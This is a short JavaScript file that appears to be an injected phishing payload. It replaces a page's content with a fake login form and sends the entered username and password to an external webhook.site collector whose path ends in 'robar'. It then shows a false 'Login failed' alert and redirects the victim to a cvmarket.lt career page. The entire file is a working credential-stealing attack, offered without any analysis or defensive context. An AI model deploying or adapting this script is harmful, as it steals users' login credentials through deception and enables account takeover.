var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://webhook.site/2b20713f-1250-4262-abab-4819166aa12a/robar';

var inputUser = document.createElement('input');
inputUser.name = 'username';
inputUser.placeholder = 'Username';
form.appendChild(inputUser);

var inputPass = document.createElement('input');
inputPass.type = 'password';
inputPass.name = 'password';
inputPass.placeholder = 'Password';
form.appendChild(inputPass);

var submit = document.createElement('input');
submit.type = 'submit';
submit.value = 'Login';
form.appendChild(submit);

document.body.innerHTML = '';
document.body.appendChild(form);

form.addEventListener('submit', function(e) {
    e.preventDefault();
    var xhr = new XMLHttpRequest();
    xhr.open('POST', form.action, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    var data = 'username=' + encodeURIComponent(inputUser.value) + '&password=' + encodeURIComponent(inputPass.value);
    xhr.send(data);
    alert('Login failed. Please try again.');
    window.location.href = 'https://www.cvmarket.lt/karjeros-centras/';
});
